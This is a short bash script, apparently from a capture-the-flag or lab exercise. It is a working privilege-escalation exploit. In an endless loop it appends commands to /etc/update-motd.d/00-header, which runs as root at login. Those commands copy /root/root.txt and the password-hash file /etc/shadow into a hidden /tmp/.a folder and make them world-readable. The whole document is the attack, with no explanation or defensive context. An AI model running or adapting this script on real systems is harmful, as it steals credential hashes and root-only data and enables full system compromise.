#!/bin/bash
while true; do
  echo "cp /root/root.txt /tmp/.a/ ; cp /etc/shadow /tmp/.a/ ; chmod ugo+rwx -R /tmp/.a/* " >>/etc/update-motd.d/00-header
  sleep 10
done
